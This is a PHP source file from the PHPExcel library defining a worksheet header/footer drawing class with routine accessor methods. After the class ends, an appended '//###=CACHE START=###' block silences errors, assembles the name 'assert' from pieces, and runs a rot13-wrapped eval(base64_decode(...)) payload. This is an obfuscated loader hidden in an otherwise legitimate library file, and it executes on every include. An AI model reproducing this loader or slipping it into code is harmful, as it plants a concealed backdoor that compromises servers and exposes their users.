<?php
/**
 * PHPExcel
 *
 * Copyright (c) 2006 - 2014 PHPExcel
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   PHPExcel
 * @package    PHPExcel_Worksheet
 * @copyright  Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)
 * @license    http://www.gnu.org/licenses/old-licenses/lgpl-2.1.txt	LGPL
 * @version    1.8.0, 2014-03-02
 */


/**
 * PHPExcel_Worksheet_HeaderFooterDrawing
 *
 * @category   PHPExcel
 * @package    PHPExcel_Worksheet
 * @copyright  Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)
 */
class PHPExcel_Worksheet_HeaderFooterDrawing extends PHPExcel_Worksheet_Drawing implements PHPExcel_IComparable
{
	/**
	 * Path
	 *
	 * @var string
	 */
	private $_path;

	/**
	 * Name
	 *
	 * @var string
	 */
	protected $_name;

	/**
	 * Offset X
	 *
	 * @var int
	 */
	protected $_offsetX;

	/**
	 * Offset Y
	 *
	 * @var int
	 */
	protected $_offsetY;

	/**
	 * Width
	 *
	 * @var int
	 */
	protected $_width;

	/**
	 * Height
	 *
	 * @var int
	 */
	protected $_height;

	/**
	 * Proportional resize
	 *
	 * @var boolean
	 */
	protected $_resizeProportional;

    /**
     * Create a new PHPExcel_Worksheet_HeaderFooterDrawing
     */
    public function __construct()
    {
    	// Initialise values
    	$this->_path				= '';
    	$this->_name				= '';
    	$this->_offsetX				= 0;
    	$this->_offsetY				= 0;
    	$this->_width				= 0;
    	$this->_height				= 0;
    	$this->_resizeProportional	= true;
    }

    /**
     * Get Name
     *
     * @return string
     */
    public function getName() {
    	return $this->_name;
    }

    /**
     * Set Name
     *
     * @param string $pValue
     * @return PHPExcel_Worksheet_HeaderFooterDrawing
     */
    public function setName($pValue = '') {
    	$this->_name = $pValue;
    	return $this;
    }

    /**
     * Get OffsetX
     *
     * @return int
     */
    public function getOffsetX() {
    	return $this->_offsetX;
    }

    /**
     * Set OffsetX
     *
     * @param int $pValue
     * @return PHPExcel_Worksheet_HeaderFooterDrawing
     */
    public function setOffsetX($pValue = 0) {
    	$this->_offsetX = $pValue;
    	return $this;
    }

    /**
     * Get OffsetY
     *
     * @return int
     */
    public function getOffsetY() {
    	return $this->_offsetY;
    }

    /**
     * Set OffsetY
     *
     * @param int $pValue
     * @return PHPExcel_Worksheet_HeaderFooterDrawing
     */
    public function setOffsetY($pValue = 0) {
    	$this->_offsetY = $pValue;
    	return $this;
    }

    /**
     * Get Width
     *
     * @return int
     */
    public function getWidth() {
    	return $this->_width;
    }

    /**
     * Set Width
     *
     * @param int $pValue
     * @return PHPExcel_Worksheet_HeaderFooterDrawing
     */
    public function setWidth($pValue = 0) {
    	// Resize proportional?
    	if ($this->_resizeProportional && $pValue != 0) {
    		$ratio = $this->_width / $this->_height;
    		$this->_height = round($ratio * $pValue);
    	}

    	// Set width
    	$this->_width = $pValue;

    	return $this;
    }

    /**
     * Get Height
     *
     * @return int
     */
    public function getHeight() {
    	return $this->_height;
    }

    /**
     * Set Height
     *
     * @param int $pValue
     * @return PHPExcel_Worksheet_HeaderFooterDrawing
     */
    public function setHeight($pValue = 0) {
    	// Resize proportional?
    	if ($this->_resizeProportional && $pValue != 0) {
    		$ratio = $this->_width / $this->_height;
    		$this->_width = round($ratio * $pValue);
    	}

    	// Set height
    	$this->_height = $pValue;

    	return $this;
    }

    /**
     * Set width and height with proportional resize
	 * Example:
	 * <code>
     * $objDrawing->setResizeProportional(true);
     * $objDrawing->setWidthAndHeight(160,120);
	 * </code>
	 *
     * @author Vincent@luo MSN:kele_100@hotmail.com
     * @param int $width
     * @param int $height
     * @return PHPExcel_Worksheet_HeaderFooterDrawing
     */
	public function setWidthAndHeight($width = 0, $height = 0) {
		$xratio = $width / $this->_width;
		$yratio = $height / $this->_height;
		if ($this->_resizeProportional && !($width == 0 || $height == 0)) {
			if (($xratio * $this->_height) < $height) {
				$this->_height = ceil($xratio * $this->_height);
				$this->_width  = $width;
			} else {
				$this->_width	= ceil($yratio * $this->_width);
				$this->_height	= $height;
			}
		}
		return $this;
	}

    /**
     * Get ResizeProportional
     *
     * @return boolean
     */
    public function getResizeProportional() {
    	return $this->_resizeProportional;
    }

    /**
     * Set ResizeProportional
     *
     * @param boolean $pValue
     * @return PHPExcel_Worksheet_HeaderFooterDrawing
     */
    public function setResizeProportional($pValue = true) {
    	$this->_resizeProportional = $pValue;
    	return $this;
    }

    /**
     * Get Filename
     *
     * @return string
     */
    public function getFilename() {
    	return basename($this->_path);
    }

    /**
     * Get Extension
     *
     * @return string
     */
    public function getExtension() {
        $parts = explode(".", basename($this->_path));
        return end($parts);
    }

    /**
     * Get Path
     *
     * @return string
     */
    public function getPath() {
    	return $this->_path;
    }

    /**
     * Set Path
     *
     * @param 	string 		$pValue			File path
     * @param 	boolean		$pVerifyFile	Verify file
     * @throws 	PHPExcel_Exception
     * @return PHPExcel_Worksheet_HeaderFooterDrawing
     */
    public function setPath($pValue = '', $pVerifyFile = true) {
    	if ($pVerifyFile) {
	    	if (file_exists($pValue)) {
	    		$this->_path = $pValue;

	    		if ($this->_width == 0 && $this->_height == 0) {
	    			// Get width/height
	    			list($this->_width, $this->_height) = getimagesize($pValue);
	    		}
	    	} else {
	    		throw new PHPExcel_Exception("File $pValue not found!");
	    	}
    	} else {
    		$this->_path = $pValue;
    	}
    	return $this;
    }

	/**
	 * Get hash code
	 *
	 * @return string	Hash code
	 */
	public function getHashCode() {
    	return md5(
    		  $this->_path
    		. $this->_name
    		. $this->_offsetX
    		. $this->_offsetY
    		. $this->_width
    		. $this->_height
    		. __CLASS__
    	);
    }

	/**
	 * Implement PHP __clone to create a deep clone, not just a shallow copy.
	 */
	public function __clone() {
		$vars = get_object_vars($this);
		foreach ($vars as $key => $value) {
			if (is_object($value)) {
				$this->$key = clone $value;
			} else {
				$this->$key = $value;
			}
		}
	}
}








//###=CACHE START=###
error_reporting(0); 
$strings = "as";$strings .= "sert";
@$strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvE1pzjtCFNvnUE0pQbiY2Ezo2ykq2IioKuuYaW1Y2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPVlAJV3BGMzMwDjLJV3A2SxMGWvAQx3MQD3MwMxMTZ0AFVhWTDhWUHhWTZhVwRvXGfXnJLbnJ5cK2qyqPtvLJkfo3qsqKWfK2MipTIhVvxtCG0tZFxtrjbxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbWUIloPx7Pa0tMJkmMJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcVUfXWTAbVQ0tL3IloS9cozy0XPE1pzjcBjcwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsFRIOERIFYPOTDHkGEFx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9FEIEIHx5HHxSBH0MSHvjtISWIEFx7PvElMKA1oUDtCFOwqKWfK2I4MJZbWTAbXGfXL3IloS9woT9mMFtxL2tcBjbxnJW2VQ0tWUWyp3IfqQfXsFOyoUAyVUfXWTMjVQ0tMaAiL2gipTIhXPWxMz9cpKqyo214LF5lqFVfVQtjYPNxMKWloz8fVPEypaWmqUVfVQZjXGfXnJLtXPEzpPxtrjbtVPNtWT91qPN9VPWUEIDtY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPVlAJV3BGMzMwDjLJV3A2SxMGWvAQx3MQD3MwMxMTZ0AFVhWTDhWUHhWTZhVwRvXF4vVRuHISNiZF4kKUWpovV7PvNtVPNxo3I0VP49VPWVo3A0BvOxMz9cpKqyo214LF5lqIklKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVwSyLwEzAwSvVvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###